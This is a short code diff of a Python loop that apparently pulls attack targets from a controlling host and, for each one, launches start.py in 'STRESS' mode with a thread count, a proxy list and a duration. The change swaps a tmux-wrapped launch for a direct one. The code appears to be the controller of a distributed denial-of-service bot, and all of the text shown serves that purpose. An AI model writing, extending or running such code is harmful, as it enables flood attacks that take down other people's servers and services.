@@ -19,4 +19,4 @@ while True:
     targets = get_targets(host)
 
     for target in targets:
-        subprocess.run(["tmux", "new-session", "-d", "python3", "start.py", "STRESS", target, "4", "auto", "proxy.txt", "61", "600"])
+        subprocess.run(["python3", "start.py", "STRESS", target, "4", "auto", "proxy.txt", "61", "600"])
